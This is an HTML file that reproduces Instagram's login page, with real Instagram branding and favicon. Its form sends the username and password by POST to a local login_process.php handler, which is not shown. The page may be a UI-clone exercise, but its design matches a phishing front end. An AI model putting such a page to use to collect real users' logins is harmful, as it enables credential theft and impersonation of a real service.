<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/De-6DZQOStQ.png"> 
   
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <main class="main-content">
           
            <section class="phone-section">
                 <img src="assets/phone-mockup.png" alt="Instagram app preview on phone">
            
            </section>

           
            <section class="form-section">
                <div class="login-box card">
                    <img class="logo light-logo" src="assets/instagram-logo-light.png" alt="Instagram Logo">
                     <img class="logo dark-logo" src="assets/instagram-logo-dark.png" alt="Instagram Logo Dark"> 

                    <form action="login_process.php" method="POST" id="login-form">
                        <div class="input-group">
                            <input type="text" name="username" id="username" required aria-label="Phone number, username, or email" placeholder="Phone number, username, or email">
                            <span class="validation-icon"></span>
                        </div>
                        <div class="input-group password-group">
                            <input type="password" name="password" id="password" required aria-label="Password" placeholder="Password">
                             <button type="button" id="togglePassword" class="toggle-password" aria-label="Show password">Show</button>
                            <span class="validation-icon"></span>
                        </div>
                        <button type="submit" class="login-button" id="loginButton" disabled>Log in</button>

                        <div class="separator">
                            <div class="line"></div>
                            <div class="or-text">OR</div>
                            <div class="line"></div>
                        </div>

                        <button type="button" class="facebook-login">
                            <i class="fab fa-facebook-square"></i>
                            <span>Log in with Facebook</span>
                        </button>

                        <a href="#" class="forgot-password">Forgot password?</a>
                    </form>
                </div>

                <div class="signup-box card">
                    <p>Don't have an account? <a href="#">Sign up</a></p>
                </div>

                <div class="app-download-box">
                    <p>Get the app.</p>
                    <div class="app-links">
                        <a href="#" aria-label="Download on the App Store"><img src="assets/app-store.png" alt="App Store"></a>
                        <a href="#" aria-label="Get it on Google Play"><img src="assets/google-play.png" alt="Google Play"></a>
                    </div>
                </div>
            </section>
        </main>

        <footer class="footer-content">
            <nav>
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Top Accounts</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </nav>
             <div class="footer-bottom">
                <select id="language-select" aria-label="Select display language">
                     <option value="en">English</option>
                     <option value="es">Español</option>
                    
                </select>
                <span>&copy; <?php echo date("Y"); ?> Instagram from Meta</span>

                
                <button id="theme-toggle" class="theme-toggle-btn" aria-label="Toggle theme">
                    <i class="fas fa-moon"></i> 
                    <i class="fas fa-sun"></i> 
                </button>
             </div>

        </footer>
    </div>

    <script src="script.js"></script>
</body>
</html>